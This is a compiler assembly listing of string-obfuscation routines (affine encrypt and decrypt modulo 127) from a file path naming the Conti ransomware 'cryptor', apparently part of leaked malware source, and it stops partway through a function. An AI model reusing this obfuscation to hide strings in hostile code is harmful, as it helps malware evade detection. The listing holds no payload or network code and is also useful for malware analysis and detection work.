; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 3a	 sub	 eax, 58			; 0000003aH
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 3a	 add	 r8d, 58			; 0000003aH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 15	 sub	 eax, 21
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 15	 add	 r8d, 21
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 0c 00 00 00	 mov	 ecx, 12
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

